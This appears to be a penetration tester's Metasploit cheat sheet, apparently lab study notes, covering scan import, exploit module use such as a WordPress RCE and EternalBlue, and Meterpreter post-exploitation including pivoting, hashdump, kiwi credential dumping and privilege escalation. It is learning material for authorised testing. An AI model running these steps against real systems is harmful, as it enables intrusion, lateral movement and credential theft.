# <u>Metasploit Workflow Cheat Sheet</u>

## Set <u>Global variables</u> in Metasploit

### Command
```msf
setg RHOSTS 192.168.1.10
setg RHOST 192.168.1.10     #some modules have rhis instead
```

## 🗂️ Workspace Management
```msf
workspace -a testing    # Create new workspace
workspace testing       # Switch to it
```

## 📥 Import Scan Data
```msf
db_import /home/kali/ubuntu_nmap.xml
```

## 🔍 Verify Imported Data
```msf
hosts        # List discovered hosts
services     # Show open ports & services per host
vulns        # Display identified vulnerabilities
```

## 🔄 Run Internal Nmap (Auto-saves to DB)
```msf
db_nmap -Pn -A 192.168.125.19
```

> 💡 No need for `-oX` — results auto-save to current workspace.

---

## 🔎 Module Discovery & Usage
### Find Modules
```msf
search wordpress
search type:auxiliary portscan
```

### Load a Module
```msf
use exploit/multi/http/wp_bricks_builder_rce
# OR use index from search: use 3
```

### View Module Info
```msf
info          # Full module details
options  # Required/optional settings (same as `show options`)
```

### Configure & Run
```msf
set RHOSTS 192.168.125.19
set LHOST 192.168.125.18
exploit       # or `run` (identical in most cases)
```

---
---
## 🖥️ Post-Exploitation (Meterpreter)

### Basic Recon
```msf
sysinfo               # OS, arch, user info

shell                 # Drop to system shell
# Then, depending on OS:
#   Linux:  /bin/bash -i    (to get interactive shell)
#   Windows: whoami         (to confirm current user)
```

>- **On Windows targets**:  
    → `shell` in Meterpreter **already gives you a Windows command prompt (`cmd.exe`)**.  
    → **No need** to run anything like `cmd.exe` or `powershell.exe` manually — you’re already in a CLI.
>- **On Linux targets**:  
    → `shell` gives you `/bin/sh`, which is often **non-interactive** (no history, no tab-completion).  
    → So you **upgrade** it with: `/bin/bash -i`
    
### Pivoting Setup
1. Get **internal IP** of compromised host (`ip a` or `ipconfig`)
2. Still in Meterpreter add route through session:
   ```msf
   run autoroute -s 192.168.99.0/24 #Or just the target IP Address
   ```
   
>Routes all traffic for `192.168.99.0/24` through this session.

3. Background session:
   ```msf
   background #To put meterpreter session in background
   ```

```msf
sessions              # List active sessions
sessions -i <ID>        # Interact with a specific session (e.g., sessions -i 1)
```
### Pivot Scanning
```msf
search portscan       # Find scanner modules
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.99.20
run
```

### Clean Up
```msf
back                  # Exit current module
unset all             # Clear all settings (optional)
```

---
---
# Meterpreter Session Management

## Background a Session
### Method 1: Command

```msf
meterpreter > background
```
→ Returns to `msf6>` prompt; session stays alive with ID (e.g., Session 1).

### Method 2: Shortcut

Press `Ctrl + Z` → type `y` when prompted.

---
## Manage Sessions

| Action | Command | Description |
|-------|--------|------------|
| **List** | `sessions` | Show all active sessions |
| **Interact** | `sessions -i 1` | Reconnect to session #1 |
| **Kill** | `sessions -k 1` | Terminate session #1 |
| **Run command on all** | `sessions -c "sysinfo"` | Execute command across all sessions |

> 💡 Use `background` to multitask in Metasploit without losing access.

---
---
# `getuid` and Other Meterpreter Commands

## Is `getuid` Only for Meterpreter?

**Yes.**  

`getuid` is a **Meterpreter-specific command** — it does **not exist** in regular shells (bash, cmd, PowerShell).

It’s part of Meterpreter’s built-in post-exploitation API.

---
## Common Meterpreter Commands

| Command | Purpose |
|--------|--------|
| `getuid` | Show current user context (e.g., `NT AUTHORITY\SYSTEM`) |
| `sysinfo` | OS version, architecture, hostname |
| `ps` | List running processes |
| `migrate <PID>` | Move Meterpreter into another process |
| `shell` | Drop to native OS shell (cmd/bash) |
| `upload / download` | Transfer files |
| `ipconfig` | Network interfaces |
| `route` | View/add routing table entries |
| `hashdump` | Dump SAM hashes (requires SYSTEM) |
| `background` | Return to MSF console, keep session |

> 💡 These only work **inside an active Meterpreter session**.

---
## How to Discover All Available Commands

### 1. **In Meterpreter:**

```msf
meterpreter > help
```

→ Lists **all built-in commands** for your payload type (Windows/Linux, x86/x64).

### 2. **Load Extensions:**

Some commands come from **extensions**:
```msf
meterpreter > load kiwi          # Mimikatz-like creds dumping
meterpreter > load espia         # Screen capture
meterpreter > help               # Now shows new commands
```

---
---
# Post-Exploitation: Privilege Escalation in Metasploit

## After Getting a Meterpreter Session

### 1. **Try Automatic Elevation**
```msf
meterpreter > getsystem
```
- Attempts built-in techniques (e.g., named pipe impersonation, token duplication)
- **Often fails** on modern Windows due to patches/UAC
- If successful → `NT AUTHORITY\SYSTEM`

---
### 2. **Background the Session**
```msf
meterpreter > background
```
- **NOT `Ctrl+C`** → that **kills** the session  
- **`background`** (or `Ctrl+Z` → then `y`) → keeps session alive with an ID (e.g., **Session 3**)

> ✅ Use `sessions` to list all active sessions  
> ✅ Use `sessions -i 3` to reattach

---
### 3. **Run Local Exploit Suggester**
Automatically identifies missing patches and available local exploits:

```msf
msf6 > search local_exploit_suggester
msf6 > use post/multi/recon/local_exploit_suggester
msf6 > set SESSION 3
msf6 > run
```

---
## Next Steps

- Manually run suggested exploit (e.g., `use exploit/windows/local/ms16_135`)
- Or use **Windows Exploit Suggester** offline for more accuracy:
  ```bash
  ./windows-exploit-suggester.py --database mssb.xlsx --systeminfo target.txt (all pasted from meterpreter sysinfo)
  ```

> ⚠️ **Kernel exploits may crash the system** — use only when necessary and in controlled labs.

---
---
# Upgrading Shell to Meterpreter

## Current Session

- Type: `shell cmd/unix` (basic command shell)

## Upgrade Process

```msf
search shell_to_meterpreter
use post/multi/manage/shell_to_meterpreter
set SESSION 1
run
```

✅ Result:  
New session opened → `meterpreter x86/linux`

> 💡 **Requirement**: Active shell session + target architecture compatibility  
> ⚠️ Fails if target lacks required libraries or payload can't execute in memory

---
---
# Using `check` in Metasploit – Vulnerability Verification

## How to Use `check`

After selecting an exploit:
```msf
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
check
```
✅ Output:  
- `[+] 192.168.1.10:445 - The target is vulnerable.`  
- `[-] 192.168.1.10:445 - The target is not vulnerable.`

> 💡 **Purpose**: Verifies exploit conditions **without launching the payload**

---
## Do You Need `db_nmap`?

**No — `check` works independently of the database.**

### Requirements for `check`:
1. **Target IP/port reachable** (via standard network scan)
2. **Exploit module supports `check`** (not all do)
3. **Correct `RHOSTS`/`RPORT` set**

---
## Critical Notes

- **Not all exploits support `check`** (e.g., client-side exploits)
- **False positives/negatives possible** (e.g., patched but version unchanged)
- **Always verify manually** if `check` is unreliable

---
---
